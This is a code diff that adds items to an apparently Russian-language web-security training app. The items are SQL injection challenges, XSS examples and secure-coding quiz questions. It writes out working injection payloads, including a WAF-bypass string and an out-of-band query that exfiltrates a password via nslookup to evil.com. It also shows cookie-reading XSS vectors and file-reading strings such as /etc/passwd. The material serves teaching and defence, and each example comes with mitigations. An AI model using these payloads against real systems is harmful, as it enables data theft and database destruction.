@@ -616,6 +616,90 @@ export const sqlChallenges = [
       'Точка с запятой позволяет выполнить несколько SQL-операторов в одном запросе. Ввод 1; DROP TABLE products;-- сначала выполняет SELECT, а затем DROP TABLE. Этот тип атаки особенно опасен, так как приводит к полной потере данных. Многие СУБД предотвращают множественные запросы, но не все.',
     successQuery: `SELECT * FROM products\nWHERE id = 1; DROP TABLE products;--`,
   },
+  {
+    id: 'beginner-3',
+    level: 'Новичок',
+    title: 'Error-based SQLi',
+    description: 'Извлеките информацию о версии базы данных через сообщения об ошибках.',
+    initialQuery: `SELECT * FROM users\nWHERE id = '[ВВОД]'`,
+    hint: 'Попробуйте передать значение, которое вызовет ошибку преобразования типов, раскрывающую версию СУБД.',
+    exampleInput: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+    explanation:
+      'Error-based SQLi использует сообщения об ошибках СУБД для извлечения информации. Когда сервер возвращает ошибку с деталями запроса, злоумышленник может получить версию БД, имена таблиц и столбцов. GROUP BY с CONCAT и RAND вызывает дублирование ключей, что генерирует ошибку, содержащую нужные данные.',
+    successQuery: `SELECT * FROM users\nWHERE id = '' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--`,
+  },
+  {
+    id: 'beginner-4',
+    level: 'Новичок',
+    title: 'Boolean-based Blind SQLi',
+    description: 'Определите, существует ли пользователь "admin", используя только ответы true/false от сервера.',
+    initialQuery: `SELECT * FROM products\nWHERE name LIKE '%[ВВОД]%'`,
+    hint: 'Используйте условие, которое возвращает разные результаты для true и false. SUBSTRING() поможет посимвольно извлечь данные.',
+    exampleInput: "' AND SUBSTRING((SELECT username FROM users WHERE id=1),1,1)='a'--",
+    explanation:
+      'Blind SQLi не возвращает данные напрямую, но позволяет делать логические выводы. Если страница отображается нормально — условие истинно. Если контент изменён или отсутствует — ложно. Перебирая символы через SUBSTRING(), можно восстановить пароль посимвольно.',
+    successQuery: `SELECT * FROM products\nWHERE name LIKE '%' AND SUBSTRING((SELECT username FROM users WHERE id=1),1,1)='a'--`,
+  },
+  {
+    id: 'advanced-2',
+    level: 'Продвинутый',
+    title: 'Time-based Blind SQLi',
+    description: 'Используйте задержки (SLEEP) для определения уязвимости, когда сервер не возвращает видимых различий.',
+    initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'`,
+    hint: 'Функция SLEEP(n) заставляет СУБД ждать n секунд. Используйте условную задержку: IF(condition, SLEEP(5), 0).',
+    exampleInput: "' OR IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(3),0)--",
+    explanation:
+      'Time-based SQLi — самый сложный тип blind-инъекций. Сервер всегда возвращает одинаковый ответ, но время ответа зависит от условия. Если задержка 3+ секунды — условие истинно. Это позволяет извлекать данные посимвольно, измеряя время ответа.',
+    successQuery: `SELECT * FROM users\nWHERE username = '' OR IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(3),0)--`,
+  },
+  {
+    id: 'advanced-3',
+    level: 'Продвинутый',
+    title: 'Second-order SQLi',
+    description: 'Внедрите SQL-инъекцию через регистрацию нового пользователя, которая сработает при изменении профиля.',
+    initialQuery: `-- Сначала данные сохраняются:\nINSERT INTO users (username, email)\nVALUES ('[ВВОД]', 'user@test.com')\n\n-- Потом используются без санитизации:\nSELECT * FROM users\nWHERE username = 'сохранённое_значение'`,
+    hint: 'При регистрации введите username, который при последующем использовании выполнит вредоносный SQL. Попробуйте: admin\\\'--',
+    exampleInput: "admin'--",
+    explanation:
+      'Second-order SQLi происходит в два этапа: 1) Вредоносный payload сохраняется в БД через看似 безобидный ввод. 2) При последующем использовании этих данных (например, при поиске по username) payload активируется. Многие разработчики санитизируют ввод, но забывают о выходе данных.',
+    successQuery: `-- Сохранение:\nINSERT INTO users (username, email)\nVALUES ('admin'--', 'user@test.com')\n\n-- Использование (часть запроса закомментирована):\nSELECT * FROM users\nWHERE username = 'admin'--'`,
+  },
+  {
+    id: 'expert-2',
+    level: 'Эксперт',
+    title: 'Out-of-band SQLi (OOB)',
+    description: 'Извлеките данные через внешний DNS-запрос, когда прямой ответ сервера недоступен.',
+    initialQuery: `SELECT * FROM users\nWHERE id = [ВВОД]`,
+    hint: 'Функция xp_cmdshell (MSSQL) или LOAD_FILE (MySQL) может инициировать DNS-запрос к контролируемому вами домену.',
+    exampleInput: "1; EXEC xp_cmdshell 'nslookup '+(SELECT TOP 1 password FROM users)+'.evil.com'--",
+    explanation:
+      'Out-of-band SQLi используется, когда нельзя получить данные через HTTP-ответ. Злоумышленник заставляет сервер сделать DNS-запрос или HTTP-запрос к внешнему серверу, внедряя данные в доменное имя. Например, password123.evil.com в логах DNS показывает извлечённый пароль.',
+    successQuery: `SELECT * FROM users\nWHERE id = 1; EXEC xp_cmdshell 'nslookup '+(SELECT TOP 1 password FROM users)+'.evil.com'--`,
+  },
+  {
+    id: 'expert-3',
+    level: 'Эксперт',
+    title: 'WAF Bypass — обход фильтрации',
+    description: 'Обойдите Web Application Firewall, используя кодирование и обфускацию SQL-запроса.',
+    initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'`,
+    hint: 'WAF блокирует ключевые слова SELECT, UNION. Попробуйте: HEX-кодирование строк, CONCAT для обхода фильтра ключевых слов, комментарии /**/ для разбивки.',
+    exampleInput: "'/*!50000UnIoN*//*!50000SeLeCt*/ 1,2,CHAR(97,100,109,105,110)--",
+    explanation:
+      'WAF использует сигнатурный анализ для блокировки SQL-инъекций. Обход возможен через: 1) Регистр: UnIoN SeLeCt. 2) Комментарии: /*!50000UNION*/ выполняется только в MySQL 5.0+. 3) HEX-кодирование: 0x61646d696e вместо \'admin\'. 4) CHAR(): CHAR(97,100,109,105,110) = \'admin\'. 5) URL-encoding: %27 вместо кавычки.',
+    successQuery: `SELECT * FROM users\nWHERE username = ''/*!50000UnIoN*/ /*!50000SeLeCt*/ 1,2,CHAR(97,100,109,105,110)--`,
+  },
+  {
+    id: 'expert-4',
+    level: 'Эксперт',
+    title: 'Polyglot SQLi — универсальный пейлоад',
+    description: 'Создайте пейлоад, работающий в MySQL, PostgreSQL и SQLite одновременно.',
+    initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'`,
+    hint: 'Polyglot-пейлоад должен использовать синтаксис, валидный во всех СУБД. Используйте: -- для комментариев (работает везде), UNION SELECT, 0x для hex.',
+    exampleInput: "1' UNION SELECT NULL,NULL,NULL-- -",
+    explanation:
+      'Polyglot SQLi — пейлоад, работающий в нескольких СУБД. Ключевые принципы: 1) Двойной дефис с пробелом (-- ) — стандартный SQL-комментарий. 2) UNION SELECT NULL — NULL работает во всех СУБД. 3) Одинарная кавычка — стандартный разделитель строк. 4) Точное количество NULL определяется числом столбцов оригинального запроса.',
+    successQuery: `SELECT * FROM users\nWHERE username = '1' UNION SELECT NULL,NULL,NULL-- -`,
+  },
 ];
 
 // ============================================================
@@ -754,6 +838,136 @@ const safeInput = decodeURIComponent(userInput);
 // Всегда валидируйте входные данные!`,
     attackDemo: '#<img src=x onerror="document.body.style.background=\'red\'">',
     mitigation: 'Используйте textContent, а не innerHTML. Кодируйте данные из location.hash, document.referrer и других клиентских источников.',
+  },
+  {
+    id: 'svg',
+    title: 'SVG XSS',
+    description:
+      'XSS через SVG-файлы — внедрение JavaScript в SVG-изображения. SVG поддерживает JavaScript, что позволяет злоумышленникам внедрять скрипты в «изображения», загружаемые на сайт.',
+    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД — загрузка SVG без проверки -->
+<img src="/uploads/user-avatar.svg" alt="Avatar">
+
+<!-- Содержимое malicious.svg: -->
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>alert(document.cookie)</script>
+  <!-- Или через обработчик событий: -->
+  <svg onload="alert(document.cookie)">
+  <!-- Или через animate: -->
+  <animate onbegin="alert(1)" attributeName="x" />
+</svg>
+
+<!-- Сервер принимает SVG без проверки: -->
+app.post('/upload', (req, res) => {
+  // Проверяет только Content-Type: image/svg+xml
+  // Но не проверяет содержимое на script/handler
+  fs.writeFile(req.file.path, req.file.buffer);
+});`,
+    secureCode: `<!-- БЕЗОПАСНЫЙ КОД — использовать img с CSP -->
+<!-- Заголовок CSP блокирует inline-скрипты в SVG: -->
+<!-- Content-Security-Policy: script-src 'self' -->
+
+<!-- Или конвертировать SVG в PNG на сервере: -->
+const sharp = require('sharp');
+app.post('/upload', async (req, res) => {
+  if (req.file.mimetype === 'image/svg+xml') {
+    // Конвертируем в PNG — JavaScript теряется
+    await sharp(req.file.buffer)
+      .png()
+      .toFile(\`uploads/\${req.file.filename}.png\`);
+  }
+});
+
+<!-- Или использовать object с sandbox: -->
+<object data="safe.svg" type="image/svg+xml"
+        sandbox="allow-same-origin">
+</object>`,
+    attackDemo: '<svg onload="alert(document.cookie)"><circle cx="50" cy="50" r="40"/></svg>',
+    mitigation: 'Конвертируйте SVG в PNG на сервере. Используйте CSP для блокировки inline-скриптов. Санитизируйте SVG через DOMPurify с удалением <script> и обработчиков событий.',
+  },
+  {
+    id: 'markdown',
+    title: 'Markdown XSS',
+    description:
+      'XSS через Markdown-рендеринг — многие парсеры Markdown позволяют HTML-разметку внутри текста, что может быть использовано для внедрения скриптов.',
+    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД — Markdown с HTML -->
+<!-- Пользовательский ввод: -->
+<!-- [Click here](javascript:alert('XSS')) -->
+<!-- Или: <img src=x onerror=alert('XSS')> -->
+
+const md = require('markdown-it')();
+const html = md.render(userInput);
+document.getElementById('content').innerHTML = html;
+
+<!-- markdown-it по умолчанию разрешает HTML -->
+<!-- React с marked: -->
+import marked from 'marked';
+function Comment({ text }) {
+  return <div dangerouslySetInnerHTML={{
+    __html: marked(text)  // HTML не санитизирован!
+  }} />;
+}`,
+    secureCode: `<!-- БЕЗОПАСНЫЙ КОД — санитизация Markdown -->
+import DOMPurify from 'dompurify';
+import marked from 'marked';
+
+function Comment({ text }) {
+  const rawHtml = marked(text);
+  const cleanHtml = DOMPurify.sanitize(rawHtml, {
+    ALLOWED_TAGS: ['p', 'strong', 'em', 'code', 'pre', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'blockquote'],
+    ALLOWED_ATTR: ['href', 'title'],
+    FORBID_ATTR: ['onerror', 'onload', 'onclick'],
+    FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form']
+  });
+  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
+}
+
+<!-- Или отключить HTML в markdown-it: -->
+const md = require('markdown-it')({ html: false });`,
+    attackDemo: '[Click here](javascript:alert(document.cookie))\n\n<img src=x onerror=alert("XSS")>',
+    mitigation: 'Отключите HTML в Markdown-парсере (html: false). Используйте DOMPurify для санитизации результата. Запретите javascript: URL-схемы.',
+  },
+  {
+    id: 'pdf',
+    title: 'PDF XSS',
+    description:
+      'XSS через PDF-файлы — встроенный PDF-просмотрщик браузера может выполнять JavaScript из PDF-документов через Embedded Files и JavaScript API PDF.',
+    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД -- PDF с JavaScript -->
+<!-- PDF может содержать: -->
+<!-- this.disclosedDoc = true; -->
+<!-- app.alert("XSS"); -->
+<!-- -->
+
+<!-- Сервер разрешает загрузку PDF: -->
+app.post('/upload-pdf', (req, res) => {
+  // Проверяет только расширение .pdf
+  // Но не проверяет содержимое на JavaScript
+  if (req.file.originalname.endsWith('.pdf')) {
+    fs.writeFile(req.file.path, req.file.buffer);
+  }
+});
+
+<!-- Пользователь открывает PDF в браузере: -->
+<embed src="/uploads/report.pdf" type="application/pdf">
+<!-- PDF.js или встроенный просмотрщик может выполнить JS -->`,
+    secureCode: `<!-- БЕЗОПАСНЫЙ КОД -- санитизация PDF -->
+const { PDFDocument } = require('pdf-lib');
+
+app.post('/upload-pdf', async (req, res) => {
+  const pdf = await PDFDocument.load(req.file.buffer);
+  // Удаляем все JavaScript из PDF
+  pdf.setJavaScript([]);
+  pdf.setJavaScriptForAction([]);
+  // Удаляем встроенные файлы
+  pdf.removeEmbeddedFiles();
+  const cleanBuffer = await pdf.save();
+  fs.writeFile(req.file.path, cleanBuffer);
+});
+
+<!-- Или конвертировать в изображения: -->
+<!-- Использовать pdf2pic или similar -->
+<embed src="/uploads/report.pdf#toolbar=0&navpanes=0" type="application/pdf">`,
+    attackDemo: 'PDF с встроенным JavaScript: this.disclosedDoc = true; app.alert("XSS");',
+    mitigation: 'Удаляйте JavaScript из PDF на сервере (pdf-lib). Конвертируйте PDF в изображения. Используйте песочницу для просмотра. Устанавливайте Content-Disposition: attachment.',
   },
 ];
 
@@ -1275,6 +1489,100 @@ await user.save();`,
     ],
     explanation:
       'Показ stack trace в продакшене раскрывает структуру приложения, пути к файлам, версии библиотек и другие данные, полезные для злоумышленника. В продакшене нужно показывать общее сообщение и логировать детали ошибки на сервере.',
+  },
+  {
+    id: 'sc-6',
+    title: 'Path Traversal — доступ к файлам вне директории',
+    category: 'Контроль доступа',
+    code: `app.get('/api/files/:filename', (req, res) => {
+  const filePath = path.join(__dirname, 'uploads', req.params.filename);
+  res.sendFile(filePath);
+});`,
+    options: [
+      { text: 'Использовать path.resolve и проверить, что файл внутри разрешённой директории', correct: true },
+      { text: 'Запретить символы .. в имени файла', correct: false },
+      { text: 'Шифровать файлы перед отдачей', correct: false },
+      { text: 'Использовать HTTPS', correct: false },
+    ],
+    explanation:
+      'Path Traversal позволяет злоумышленнику получить доступ к файлам вне предназначенной директории через ../../../etc/passwd. path.resolve нормализует путь, после чего нужно проверить, что результат начинается с разрешённой директории: if (!resolvedPath.startsWith(allowedDir)) return 403.',
+  },
+  {
+    id: 'sc-7',
+    title: 'XML External Entity (XXE) Injection',
+    category: 'Инъекции',
+    code: `const libxml = require('libxmljs');
+app.post('/api/parse-xml', (req, res) => {
+  const xml = req.body.xml;
+  const doc = libxml.parseXml(xml);
+  // XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+  res.json({ data: doc.text() });
+});`,
+    options: [
+      { text: 'Отключить внешние сущности в парсере: libxml.parseXml(xml, { noent: false, dtdvalid: false })', correct: true },
+      { text: 'Экранировать символы < и > во входных данных', correct: false },
+      { text: 'Использовать JSON вместо XML', correct: false },
+      { text: 'Ограничить размер XML-документа', correct: false },
+    ],
+    explanation:
+      'XXE позволяет читать файлы с сервера, выполнять SSRF и DoS (Billion Laughs attack). Внешние сущности в DTD обрабатываются парсером по умолчанию. Решение — отключить noent (substitute entities) и загрузку внешних сущностей. Или использовать парсер без DTD-поддержки.',
+  },
+  {
+    id: 'sc-8',
+    title: 'Server-Side Request Forgery (SSRF)',
+    category: 'Сетевая безопасность',
+    code: `app.get('/api/proxy', async (req, res) => {
+  const url = req.query.url;
+  const response = await fetch(url);
+  const data = await response.text();
+  res.send(data);
+});`,
+    options: [
+      { text: 'Валидировать URL: разрешить только HTTPS и белый список доменов, заблокировать внутренние IP', correct: true },
+      { text: 'Использовать POST вместо GET', correct: false },
+      { text: 'Добавить таймаут для fetch', correct: false },
+      { text: 'Ограничить размер ответа', correct: false },
+    ],
+    explanation:
+      'SSRF позволяет злоумышленнику заставить сервер делать запросы к внутренним ресурсам: 169.254.169.254 (AWS метаданные), localhost, внутренние API. Защита: белый список доменов, блокировка приватных IP (10.x, 172.16.x, 192.168.x, 127.x), только HTTPS, DNS-rebind protection.',
+  },
+  {
+    id: 'sc-9',
+    title: 'Insecure Deserialization',
+    category: 'Сериализация',
+    code: `const serialize = require('node-serialize');
+app.post('/api/profile', (req, res) => {
+  const profile = serialize.unserialize(req.body.profile);
+  res.json(profile);
+});`,
+    options: [
+      { text: 'Использовать JSON.parse вместо кастомной десериализации и валидировать схему через Zod', correct: true },
+      { text: 'Добавить try-catch вокруг unserialize', correct: false },
+      { text: 'Проверять размер входных данных', correct: false },
+      { text: 'Использовать HTTPS для передачи данных', correct: false },
+    ],
+    explanation:
+      'Небезопасная десериализация позволяет выполнить произвольный код. node-serialize поддерживает IIFE (_$$ND_FUNC$$_function(){...}()), который выполняется при десериализации. Решение: использовать JSON.parse (не выполняет код) + валидация схемы (Zod, Joi) для проверки структуры данных.',
+  },
+  {
+    id: 'sc-10',
+    title: 'Race Condition — гонка данных',
+    category: 'Конкурентность',
+    code: `app.post('/api/withdraw', async (req, res) => {
+  const user = await db.getUser(req.user.id);
+  if (user.balance >= req.body.amount) {
+    await db.updateBalance(req.user.id, user.balance - req.body.amount);
+    res.json({ success: true });
+  }
+});`,
+    options: [
+      { text: 'Использовать атомарную операцию: UPDATE users SET balance = balance - ? WHERE id = ? AND balance >= ?', correct: true },
+      { text: 'Добавить блокировку на чтение пользователя', correct: false },
+      { text: 'Использовать транзакцию без проверки баланса', correct: false },
+      { text: 'Увеличить таймаут запроса', correct: false },
+    ],
+    explanation:
+      'Race Condition возникает при одновременных запросах: два запроса читают баланс 100, оба проверяют >= 50, оба списывают 50 → баланс становится -50. Атомарная операция UPDATE ... WHERE balance >= ? гарантирует, что проверка и обновление выполняются как единая операция без промежутка.',
   },
 ];
 
